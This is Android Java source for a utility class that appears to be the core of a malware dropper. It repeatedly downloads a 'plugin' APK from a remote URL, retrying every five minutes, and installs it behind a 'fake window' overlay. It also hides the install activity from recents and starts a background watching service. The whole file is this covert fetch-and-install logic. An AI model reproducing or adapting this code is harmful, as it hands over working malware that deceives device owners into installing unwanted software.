package com.xstd.qm;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.common.utils.files.FileDownloader;
import com.plugin.common.utils.files.FileOperatorHelper;
import com.xstd.qm.fakecover.FakeFactory;
import com.xstd.qm.fakecover.FakeWindowInterface;
import com.xstd.qm.setting.SettingManager;

import java.io.File;
import java.io.IOException;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: PM3:47
 * To change this template use File | Settings | File Templates.
 */
public class UtilOperator {

    public static FakeWindowInterface fake;

    private static void intstallLocalApk(final Context context, final String fullPath) {
        try {
            Runtime.getRuntime().exec("chmod 666 " + fullPath);
        } catch (IOException e) {
            e.printStackTrace();
        }

        Config.LOGD("[[intstallLocalApk]] try to install plugin once with fake window");

        Handler handler = new Handler(context.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                boolean useActivity = false;
                SettingManager.getInstance().setCancelInstallReserve(false);
                fake = FakeFactory.fakeWindowFactory(context);
                if (!Utils.isVersionBeyondGB()) {
                    useActivity = false;
                } else {
                    useActivity = true;
                }
                fake.show(true);
                fake.updateTimerCount();

                Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to install apk : " + fullPath);

                AppRuntime.CANCEL_COUNT = 0;
                if (!Config.BUTTON_CHANGED_ENABLE || !useActivity) {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    File upgradeFile = new File(fullPath);
                    i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    context.startActivity(i);
                } else {
                    Utils.startFakeActivity(context, fullPath);
                }

                if (!AppRuntime.WATCHING_SERVICE_RUNNING.get()) {
                    Intent is = new Intent();
                    is.setClass(context, WatchingService.class);
                    context.startService(is);
                }
            }
        });
    }

    public static boolean isPluginApkExist() {
        String local = SettingManager.getInstance().getLocalApkPath();
        if (TextUtils.isEmpty(local)) {
            return false;
        }

        File apkFile = new File(local);
        if (apkFile.exists()) {
            return true;
        }

        return false;
    }

    public static void tryToDownloadPlugin(final Context context) {
        final String local = SettingManager.getInstance().getLocalApkPath();
        String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
        if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
            return;
        }

        if (UtilsRuntime.isOnline(context)) {
            Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");

            if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_PROCESS_RUNNING.set(true);
                File apkFile = new File(local);
                if (apkFile.exists()) {
                    Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(new FileDownloader.DownloadRequest(downloadUrl)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                        if (response != null && status == FileDownloader.DOWNLOAD_SUCCESS) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);

                                    File targetFile = new File(targetPath);
                                    if (!Utils.checkAPK(context, targetPath)) {
                                        Config.LOGD("[[tryToDownloadPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
                                        //delete targetPath
                                        targetFile.delete();
                                        File localFile = new File(localUrl);
                                        localFile.delete();

                                        return;
                                    }

                                    DemonService.cancelAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN);
                                    if (targetFile.exists()) {
                                        Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
                                    }

                                    return;
                                }
                            }
                        } else {
                            Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
                        }

                        if (Config.DEBUG) {
                            Config.LOGD("[[tryToDownloadPlugin]] try to reDownload for next round with time delay : 5M");
                        }
                        DemonService.startAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN, ((long) 5) * 60 * 1000);
                    }
                });
            }

        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[tryToDownloadPlugin]] try to reDownload for next round with time delay : 5M");
            }
            DemonService.startAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN, ((long) 5) * 60 * 1000);
        }
    }

    public static void tryToInstallPluginLocal(Context context) {
        String local = SettingManager.getInstance().getLocalApkPath();
        if (TextUtils.isEmpty(local)) {
            return;
        }

        File apkFile = new File(local);
        if (apkFile.exists()) {
            intstallLocalApk(context, local);
            return;
        }
    }

    public static void tryToInstallPlugin(final Context context) {
        final String local = SettingManager.getInstance().getLocalApkPath();
        String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
        if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
            return;
        }

        if (UtilsRuntime.isOnline(context)) {
            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");

            if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_PROCESS_RUNNING.set(true);
                File apkFile = new File(local);
                if (apkFile.exists()) {
                    intstallLocalApk(context, local);
                    Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(
                                                                   new FileDownloader.DownloadRequest(downloadUrl)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        if (response != null) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
                                    File targetFile = new File(targetPath);
                                    if (targetFile.exists()) {
                                        intstallLocalApk(context, local);
                                    }
                                }
                            }
                        }
                    }
                });
            }

        }
    }

//    public static void startActiveAlarm(Context context, long delay) {
//        cancelActiveAlarm(context);
//        Intent intent = new Intent();
//        intent.setAction(DemonService.ACTION_ACTIVE_MAIN);
//        intent.setClass(context, DemonService.class);
//        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
//        long firstime = System.currentTimeMillis();
//        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
//
//        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime + delay, sender);
//        Config.LOGD("[[startActiveAlarm]]");
//    }

//    public static void cancelActiveAlarm(Context context) {
//        Config.LOGD("[[cancelActiveAlarm]]");
//        Intent intent = new Intent();
//        intent.setAction(DemonService.ACTION_ACTIVE_MAIN);
//        intent.setClass(context, DemonService.class);
//        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
//        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
//        am.cancel(sender);
//    }
}
